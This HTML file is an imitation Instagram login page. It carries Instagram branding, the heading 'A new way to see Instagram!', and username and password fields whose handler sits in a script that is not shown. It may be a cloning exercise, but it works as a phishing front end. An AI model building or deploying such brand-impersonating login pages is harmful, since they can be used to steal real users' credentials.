<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
    <link rel="website icon" type="jpg"  href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1200px-Instagram_icon.png">
</head>
<body>
    
    <div class="login-container">
        <h1 class="heading">A new way to see Instagram!</h1>
        <img class="srk" src="E7m8ZCMOFDS.png" alt="">
        <input type="username" id="username" name="username" placeholder="Username">
        <input type="password" id="password" name="password" placeholder="Password">
        <button onclick=handleLogin()>Log In</button>
        <div class="divider">OR</div>
        <div id="facebook-login"><i class="fab fa-facebook-square"></i> Log in with Facebook</div>
        <div id="forgot-password">Forgot password?</div>
    </div>

   <div class="hero">
    <img src="instagram-web-lox-image.png" alt="">
   </div>
</body>

<script src="script.js"></script>
</html>
